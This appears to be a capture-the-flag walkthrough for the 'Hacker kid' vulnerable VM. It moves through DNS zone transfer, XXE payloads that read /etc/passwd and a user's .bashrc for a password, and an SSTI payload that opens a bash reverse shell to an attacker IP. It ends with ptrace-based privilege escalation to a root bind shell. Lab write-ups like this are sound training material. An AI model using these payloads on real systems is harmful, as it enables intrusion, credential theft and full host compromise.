Hacker kid: 1.0.1
Recon

Open ports: 53 (DNS), 80 (HTTP), 9999 (HTTP)
DNS Enumeration

Zone transfer on port 53:

dig @192.168.31.150 AXFR blackhat.local

Found subdomain: hackerkid.blackhat.local
Virtual Host Discovery

Added to /etc/hosts:

192.168.31.150    hackerkid.blackhat.local

On hackerkid.blackhat.local found a registration form.
XXE Injection

The form sends XML to process.php. Testing for XXE:

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <name>test</name>
  <tel>123</tel>
  <email>&xxe;</email>
  <password>test</password>
</root>

Read /etc/passwd, found user saket (uid 1000).
Password Discovery

Read /home/saket/.bashrc via XXE:

<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">

Found:

username="admin"
password="Saket!#$%@!!"

Initial Foothold via SSTI

Login to Tornado app on port 9999 with("admin" was incorrect):

    Username: saket

    Password: Saket!#$%@!!

After login, found SSTI vulnerability in name parameter:

http://192.168.31.150:9999/?name={{7*7}}

Response: Hello 49
Reverse Shell via SSTI

Got reverse shell through SSTI:

%7B%7B__import__('os').popen('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.209%2F4444%200%3E%261%22').read()%7D%7D

Privilege Escalation

Check capabilities:

/usr/sbin/getcap -r / 2>/dev/null

Found:

/usr/bin/python2.7 = cap_sys_ptrace+ep

Exploitation

Used python2.7 with cap_sys_ptrace to inject shellcode into a root process.

Created ptrace injection exploit for bind shell on port 5600.

Run:

/usr/bin/python2.7 /tmp/inject.py 2851

Root Shell

Connect to bind shell:

nc 127.0.0.1 5600
id
# uid=0(root) gid=0(root) groups=0(root)
